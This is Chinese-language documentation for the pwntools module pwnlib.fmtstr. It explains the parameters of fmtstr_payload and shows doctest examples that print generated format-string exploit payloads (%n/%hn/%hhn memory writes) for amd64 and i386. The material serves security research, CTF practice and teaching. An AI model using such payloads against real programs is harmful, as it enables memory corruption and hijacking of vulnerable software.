.. testsetup:: *

	from pwn import *
	import tempfile

:mod:`pwnlib.fmtstr` --- 格式化字符串漏洞利用工具
=============================================================

``pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') → str``

当我们想要利用格式化字符串修改对应地址的值时，我们可以使用fmt_payload来进行构造。无论是32位还是64位，它都适用。其中，地址的大小是从 ``context.bits`` 中获取的。

参数如下

- offset (int) – 表示你第一个可以控制的参数，也就是我们常说的格式化字符串中第一次重复出现的位置。
- writes (dict) – 字典格式，其中key为想要写的地址，value为对应的想要写的值，格式 {addr: value, addr2: value2}。
- numbwritten (int) – printf已经输出的字节数。
- write_size (str) – 只能是byte, short or int. 这个表明我们想怎么来修改对应地址的数值(hhn, hn or n)。

该函数返回所想要生成的payload。

例子::

    >>> context.clear(arch = 'amd64')
    >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int'))
    '\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00%322419374c%1$n%3972547906c%2$n'
    >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short'))
    '\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00%47774c%1$hn%22649c%2$hn%60617c%3$hn%4$hn'
    >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte'))
    '\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00%126c%1$hhn%252c%2$hhn%125c%3$hhn%220c%4$hhn%237c%5$hhn%6$hhn%7$hhn%8$hhn'
    >>> context.clear(arch = 'i386')
    >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int'))
    '\x00\x00\x00\x00%322419386c%1$n'
    >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short'))
    '\x00\x00\x00\x00\x02\x00\x00\x00%47798c%1$hn%22649c%2$hn'
    >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte'))
    '\x00\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00%174c%1$hhn%252c%2$hhn%125c%3$hhn%220c%4$hhn'
